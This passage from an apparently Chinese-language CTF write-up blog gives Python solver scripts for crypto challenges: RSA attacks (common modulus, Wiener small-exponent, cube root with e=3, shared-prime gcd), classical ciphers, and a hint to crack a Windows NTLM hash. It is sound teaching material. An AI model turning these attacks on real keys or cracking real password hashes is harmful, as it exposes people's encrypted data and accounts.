class="keyword">import</span> gmpy2  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes  </span><br><span class="line">  </span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span>  </span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span>  </span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span>  </span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span>   </span><br><span class="line">  </span><br><span class="line">InvQ=gmpy2.invert(q,p)  </span><br><span class="line">mp=pow(c,dp,p)  </span><br><span class="line">mq=pow(c,dq,q)  </span><br><span class="line">m=(((mp-mq)*InvQ)%p)*q+mq  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)  </span><br></pre></td></tr></table></figure><h2 id="权限获得第一步"><a href="#权限获得第一步" class="headerlink" title="权限获得第一步"></a>权限获得第一步</h2><p><code>Administrator:806EDC27AA52E314AAD3B435B51404EE:F4AD50F57683D4260DFD48AA351A17A8:1</code></p><p>windows密码，倒数第二个数值是密码，尝试md5解密。</p><h2 id="萌萌哒的八戒"><a href="#萌萌哒的八戒" class="headerlink" title="萌萌哒的八戒"></a>萌萌哒的八戒</h2><p>提示八戒，一看就是猪圈密码。</p><h2 id="RSA3"><a href="#RSA3" class="headerlink" title="RSA3"></a>RSA3</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n = <span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">11187289</span></span><br><span class="line">e2 = <span class="number">9647291</span></span><br><span class="line">s = gcdext(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = -s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">c2 = <span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">c2 = invert(c2, n)</span><br><span class="line">m = (pow(c1,s1,n) * pow(c2 , s2 , n)) % n</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(m)</span><br></pre></td></tr></table></figure><h2 id="异性相吸"><a href="#异性相吸" class="headerlink" title="异性相吸"></a>异性相吸</h2><p>异或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">steady_str&#x3D;&quot;asadsasdasdasdasdasdasdasdasdasdqwesqf&quot;</span><br><span class="line">f&#x3D;open(&quot;&#x2F;Users&#x2F;apple&#x2F;Downloads&#x2F;1&#x2F;密文.txt&quot;,&quot;r&quot;).read()</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(0,len(steady_str)):</span><br><span class="line">    flag+&#x3D;chr(ord(steady_str[i])^ord(f[i]))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="RSA-1"><a href="#RSA-1" class="headerlink" title="RSA"></a>RSA</h2><p>拿到public.key，使用openssl</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">OpenSSL&gt; rsa -pubin -text -modulus -in &#x2F;Users&#x2F;apple&#x2F;Downloads&#x2F;0eaf8d6c-3fe5-4549-9e81-94ac42535e7b&#x2F;pub.key</span><br><span class="line">Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:c0:33:2c:5c:64:ae:47:18:2f:6c:1c:87:6d:42:</span><br><span class="line">    33:69:10:54:5a:58:f7:ee:fe:fc:0b:ca:af:5a:f3:</span><br><span class="line">    41:cc:dd</span><br><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus&#x3D;C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMAzLFxkrkcYL2wch21CM2kQVFpY9+7+</span><br><span class="line">&#x2F;AvKr1rzQczdAgMBAAE&#x3D;</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>e=65537</p><p>n=C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes  </span><br><span class="line"> </span><br><span class="line">n = <span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span>  </span><br><span class="line">p = <span class="number">285960468890451637935629440372639283459</span>  </span><br><span class="line">q = <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">e = <span class="number">65537</span>  </span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)  </span><br><span class="line">d = libnum.invmod(e,phi)  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;/Users/apple/Desktop/flag.enc&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    c = f.read().encode(<span class="string">&#x27;hex&#x27;</span>)  </span><br><span class="line">    c = int(c,<span class="number">16</span>)  </span><br><span class="line">m = pow(c,d,n)  </span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure><h2 id="GKCTF2020-汉字的秘密"><a href="#GKCTF2020-汉字的秘密" class="headerlink" title="GKCTF2020]汉字的秘密"></a>GKCTF2020]汉字的秘密</h2><p>当铺密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&#x27;田口由中人工大土士王夫井羊壮&#x27;</span></span><br><span class="line">y = <span class="string">&#x27;00123455567899&#x27;</span></span><br><span class="line">z = <span class="string">&#x27;王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫&#x27;</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> z:</span><br><span class="line">   <span class="keyword">if</span> i <span class="keyword">in</span> x:</span><br><span class="line">      s += y[x.index(i)]</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">      s += <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line">ll = s.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(ll)):</span><br><span class="line">    t += chr(int(ll[i]) + i + <span class="number">1</span>)</span><br><span class="line">print(t.lower())</span><br></pre></td></tr></table></figure><h2 id="RSAROLL"><a href="#RSAROLL" class="headerlink" title="RSAROLL"></a>RSAROLL</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">e=<span class="number">19</span></span><br><span class="line">q=<span class="number">18443</span></span><br><span class="line">p=<span class="number">49891</span></span><br><span class="line">n=<span class="number">920139713</span></span><br><span class="line">phin = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e, phin)</span><br><span class="line">f=open(<span class="string">&#x27;/Users/apple/Desktop/data.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">    m=pow(int(i),d,n)</span><br><span class="line">    flag+=chr(m)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="Dangerous-RSA"><a href="#Dangerous-RSA" class="headerlink" title="Dangerous RSA"></a>Dangerous RSA</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#n:  0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793L</span><br><span class="line">#e:  0x3</span><br><span class="line">#c:0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span><br><span class="line">so,how to get the message?</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n=<span class="number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span></span><br><span class="line">e=<span class="number">3</span>    </span><br><span class="line">res=<span class="number">0</span></span><br><span class="line">c=<span class="number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span> </span><br><span class="line"><span class="keyword">print</span> time.asctime()    </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">200000000</span>):    </span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot(c+n*k,<span class="number">3</span>)[<span class="number">1</span>]==<span class="number">1</span>:    </span><br><span class="line">        res=gmpy2.iroot(c+n*k,<span class="number">3</span>)[<span class="number">0</span>]    </span><br><span class="line">        <span class="keyword">print</span> k,res    </span><br><span class="line">        <span class="keyword">print</span> long_to_bytes(res)    </span><br><span class="line">        <span class="keyword">print</span> time.asctime()    </span><br><span class="line">        <span class="keyword">break</span>  </span><br></pre></td></tr></table></figure><h2 id="Cipher"><a href="#Cipher" class="headerlink" title="Cipher"></a>Cipher</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">还能提示什么呢？公平的玩吧（密钥自己找） Dncnoqqfliqrpgeklwmppu 注意：得到的 flag 请包上 flag&#123;&#125; 提交, flag&#123;小写字母&#125;</span><br></pre></td></tr></table></figure><p>playfair密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pycipher import Playfair</span><br><span class="line">a&#x3D;Playfair(&#39;playfirbcdeghkmnoqstuvwx&#39;).decipher(&#39;Dncnoqqfliqrpgeklwmppu&#39;)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>在线网站==<code>http://rumkin.com/tools/cipher/playfair.php</code>。</p><h2 id="AFCTF2018-Morse"><a href="#AFCTF2018-Morse" class="headerlink" title="[AFCTF2018]Morse"></a>[AFCTF2018]Morse</h2><p>莫斯密码解密-十六进制转换字符串。</p><h2 id="HDCTF2019-basic-rsa"><a href="#HDCTF2019-basic-rsa" class="headerlink" title="[HDCTF2019]basic rsa"></a>[HDCTF2019]basic rsa</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=<span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q=<span class="number">262854994239322828547925595487519915551</span></span><br><span class="line">e=<span class="number">65533</span></span><br><span class="line">n=p*q</span><br><span class="line">c=<span class="number">27565231154623519221597938803435789010285480123476977081867877272451638645710</span></span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">d=int(gmpy2.invert(e,phi))</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="达芬奇密码"><a href="#达芬奇密码" class="headerlink" title="达芬奇密码"></a>达芬奇密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">达芬奇隐藏在蒙娜丽莎中的数字列:1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711 </span><br><span class="line">记录在达芬奇窗台口的神秘数字串:36968853882116725547342176952286</span><br></pre></td></tr></table></figure><p>第零位1还是1，没有位移。</p><p>第一位233是斐波那契数列的第十二位（以0开始算），因此下面神秘数字串的第一位的6是原本flag的第十二位。</p><p>第二位3是斐波那契数列的第三位，因此下面神秘数字串的第二位的9是原本flag的第三位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#主要思路是遍历fakefibbo，然后找出对应哪一位，如fb中第二个数对应rb中第五个</span></span><br><span class="line"><span class="comment">#然后cipher对应fakebibbo,因此cipher中第二个数对应flag第五个数</span></span><br><span class="line"><span class="comment">#因此有reslut[4]=cipher[1],依次类推</span></span><br><span class="line">realfibbo = <span class="string">&#x27;1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 2584 4181 6765 10946 17711 28657 46368 75025 121393 196418 317811 514229 832040 1346269 2178309&#x27;</span></span><br><span class="line">fakefibbo = <span class="string">&#x27;1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711&#x27;</span></span><br><span class="line">cipher = <span class="string">&#x27;36968853882116725547342176952286&#x27;</span></span><br><span class="line">realfibbo = realfibbo.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">fakefibbo = fakefibbo.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">result = [<span class="string">&#x27;a&#x27;</span>]*<span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line"><span class="comment">#这里要考虑到第二个1(fb[24])寻找的时候，会找到1123中第一个数，也就是index=0，而我们希望他找到第二个数，也就是index=1</span></span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">24</span>):</span><br><span class="line">        index = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        index = realfibbo.index(fakefibbo[i])</span><br><span class="line">    result[index] = cipher[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    print(i,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">##37995588256861228614165223347687[Finished in 0.2s]</span></span><br></pre></td></tr></table></figure><h2 id="rsa2"><a href="#rsa2" class="headerlink" title="rsa2"></a>rsa2</h2><p>求出d即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(hex(d)).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>e太大尝试低解密指数攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener_hack</span>(<span class="params">e, n</span>):</span></span><br><span class="line">    <span class="comment"># firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git !</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            discr = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> (discr &gt;= <span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t != <span class="number">-1</span> <span class="keyword">and</span> (s + t) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">&quot;Hacked!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    n = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">    e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line">    c = <span class="number">38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192</span></span><br><span class="line">    d = wiener_hack(e, n)</span><br><span class="line">    print(d)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-CheckIn"><a href="#GXYCTF2019-CheckIn" class="headerlink" title="[GXYCTF2019]CheckIn"></a>[GXYCTF2019]CheckIn</h2><p><code>dikqTCpfRjA8fUBIMD5GNDkwMjNARkUwI0BFTg==</code>尝试base64解密</p><p><code>v)*L*_F0&lt;&#125;@H0&gt;F49023@FE0#@EN</code>,rot47解密，拿到flag。</p><h2 id="RSA5"><a href="#RSA5" class="headerlink" title="RSA5"></a>RSA5</h2><p>通过对不同的n进行gcd()算法，求出最大公约数，（即p）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n1 = <span class="number">20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span></span><br><span class="line">c1 = <span class="number">974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759</span></span><br><span class="line">c2 = <span class="number">15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855</span></span><br><span class="line"></span><br><span class="line">n3 = <span 